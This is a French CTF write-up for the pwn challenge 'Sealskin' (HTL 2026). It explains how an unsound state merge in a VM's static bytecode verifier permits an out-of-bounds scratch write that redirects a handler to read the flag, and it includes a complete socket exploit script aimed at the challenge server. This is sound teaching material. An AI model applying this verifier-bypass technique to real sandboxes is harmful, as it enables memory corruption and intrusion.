# Sealskin — writeup

- **CTF** : Hack Ton Lycée (HTL) 2026
- **Catégorie** : pwn
- **Remote** : `nc pwn.ctf.yogosha.com 30002`
- **Binaire** : VM à registres + vérifieur statique (`vm.c`).

## Énoncé

VM à registres sandboxée. On soumet du bytecode ; le service le **vérifie
statiquement** (sûreté mémoire vis-à-vis d'un scratch de 64 slots) puis
l'interprète. L'interpréteur **fait confiance au vérifieur** : `LD`/`ST` indexent
`scratch[]` **sans aucun bound check runtime**. Il faut trouver l'unique faille
de raisonnement du vérifieur, forger un programme accepté mais non sûr, et
transformer l'accès hors-bornes en contrôle de l'interpréteur.

## La cible

```c
struct VM {
    int64_t  regs[8];
    int64_t  scratch[64];
    uint64_t handler_idx;   // <-- juste après scratch[63]
    int      conn_fd;
};
static handler_fn gates[2] = { hdl_halt, hdl_gift };
// HALT : gates[vm->handler_idx](vm);
```

`handler_idx` démarre à 0 (`hdl_halt`). `gates[1] = hdl_gift` lit et renvoie
`/srv/flag.txt`. **Objectif : mettre `handler_idx = 1`** via une écriture
scratch hors-bornes, puis `HALT`. `handler_idx` est exactement à `scratch[64]`.

## La faille du vérifieur

Le domaine abstrait par registre est `(umin, umax, off)` où `off` est la borne
« prouvée quand le registre sert d'index ». `LD`/`ST` exigent `off < 64`.

La passe `JLTU dst, src` resserre `off` et `umax` **uniquement sur l'arête
prise** (`taken`), à `src.umax - 1`. L'arête *fall-through* ne resserre que
`umin`. Au **point de jonction**, `propagate` fusionne les états avec
`av_merge` :

```c
r.umax = max(a.umax, b.umax);   // borne haute = max
r.off  = min(a.off,  b.off);    // index-bound = min   <-- UNSOUND
```

Donc en fusionnant l'arête `taken` (off petit, umax petit) avec l'arête
`fall-through` (off grand, umax grand), on obtient **`off` petit** (celui de
`taken`) mais **`umax` grand** (celui de `fall-through`). Le vérifieur croit
l'index borné (`off < 64`) alors que, sur le chemin `fall-through`, la valeur
runtime peut être **≥ 64**.

## Exploitation pas à pas

Encodage d'une instruction (8 octets) et opcodes :

```python
import socket, struct
def insn(op, dst=0, src=0, imm=0):
    return struct.pack("<BBBBI", op, dst, src, 0, imm & 0xffffffff)
(HALT,MOV,MOVR,ADD,ADDI,SUB,SUBI,AND,OR,SHL,XOR,LD,ST,JMP,JLTU,JEQ,JSLT,OUT,NOP) = range(19)
```

**Étape 1 — un registre « inconnu pour le vérifieur, contrôlé au runtime ».**
`scratch_init` est fourni par nous. On met `64` dans `scratch[0]`, puis on le
charge : le vérifieur considère le résultat d'un `LD` comme `top` (inconnu),
alors qu'au runtime `r0 = 64`.

```python
scratch = struct.pack("<q", 64)      # scratch[0] = 64
p  = insn(LD, 0, 1)                  # 0: r0 = scratch[r1=0] = 64 (runtime) / top (abstrait)
```

**Étape 2 — le témoin de comparaison.** `r1 = 64`, la borne qu'on va exploiter.

```python
p += insn(MOV, 1, imm=64)            # 1: r1 = 64
```

**Étape 3 — le branchement qui crée deux états.** Au runtime `64 < 64` est faux
→ on prend le *fall-through*. Mais le vérifieur propage **aussi** l'arête
`taken`, où il resserre `r0.off = 63`.

```python
p += insn(JLTU, 0, 1, 4)             # 2: si r0<64 -> 4 ; faux => fall vers 3
p += insn(NOP)                       # 3: fall-through, puis -> 4
```

**Étape 4 — la jonction empoisonnée.** À l'instruction `4`, les états `taken`
(venu de `2`) et `fall-through` (venu de `3`) fusionnent. `av_merge` prend
`off = min(63, top) = 63` (**< 64, accepté**) mais `umax = max(63, top) = top`.
Le vérifieur croit donc `r0` borné, alors que sur le chemin réellement pris
(`fall`) `r0 = 64`.

```python
p += insn(MOV, 2, imm=1)             # 4: (jonction) r2 = 1
p += insn(ST,  0, 2)                 # 5: scratch[r0=64] = 1  => handler_idx = 1
```

**Étape 5 — déclencher le cadeau.** `handler_idx` vaut maintenant `1`, donc
`HALT` appelle `gates[1] = hdl_gift`, qui lit `/srv/flag.txt`.

```python
p += insn(HALT)                      # 6: gates[1] = hdl_gift -> flag
```

**Envoi** (programme puis scratch, tous deux préfixés de leur longueur `u32` LE) :

```python
s = socket.create_connection(("pwn.ctf.yogosha.com", 30002))
s.sendall(struct.pack("<I", len(p)) + p)
s.sendall(struct.pack("<I", len(scratch)) + scratch)
print(s.recv(4096))   # ACCEPT\n<flag>
```

> Variante : écrire plus loin (`scratch[65+]`) permet d'autres corruptions, mais
> `handler_idx` est le chemin le plus court vers le flag.

## Exploit complet

Testé en local contre `vm.c` compilé. Lancement :

```
python3 exploit.py pwn.ctf.yogosha.com 30002
```

Script intégral :

```python
#!/usr/bin/env python3
# Sealskin (HTL 2026) — exploit autonome (sockets, sans dépendance).
import socket, struct, sys

# --- encodage d'une instruction (8 octets) ---
def insn(op, dst=0, src=0, imm=0):
    return struct.pack("<BBBBI", op, dst, src, 0, imm & 0xffffffff)

(HALT, MOV, MOVR, ADD, ADDI, SUB, SUBI, AND, OR,
 SHL, XOR, LD, ST, JMP, JLTU, JEQ, JSLT, OUT, NOP) = range(19)

def build_program():
    prog  = insn(LD,   0, 1)        # 0: r0 = scratch[r1=0] = 64 runtime / top abstrait
    prog += insn(MOV,  1, imm=64)   # 1: r1 = 64
    prog += insn(JLTU, 0, 1, 4)     # 2: r0<64 ? -> 4 ; faux => fall vers 3
    prog += insn(NOP)               # 3: fall-through -> 4
    prog += insn(MOV,  2, imm=1)    # 4: (jonction) r2 = 1
    prog += insn(ST,   0, 2)        # 5: scratch[r0=64] = 1 => handler_idx = 1
    prog += insn(HALT)              # 6: gates[1] = hdl_gift -> flag
    return prog

def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 9103
    prog = build_program()
    scratch = struct.pack("<q", 64)        # scratch[0] = 64 (valeur runtime)

    s = socket.create_connection((host, port), timeout=5); s.settimeout(3)
    s.sendall(struct.pack("<I", len(prog)) + prog)
    s.sendall(struct.pack("<I", len(scratch)) + scratch)

    data = b""
    try:
        while True:
            c = s.recv(4096)
            if not c: break
            data += c
    except socket.timeout:
        pass
    print("recv:", data)
    i = data.find(b"HTL{")
    if i >= 0:
        print("FLAG:", data[i:data.find(b'}', i)+1].decode(errors="replace"))

if __name__ == "__main__":
    main()
```

## Points clés

- La faille est la **fusion de `off` par `min`** indépendamment de `umax` dans
  `av_merge` : un `off` resserré sur une arête masque une valeur réelle non
  bornée venant d'une autre arête.
- L'interpréteur ne revalide jamais les index (`vm.c` `OP_ST` : `scratch[idx] =
  R[src]` direct) → l'OOB est immédiat.

## Flag

`HTL{...}` (renvoyé par `hdl_gift` après avoir forcé `handler_idx = 1`).
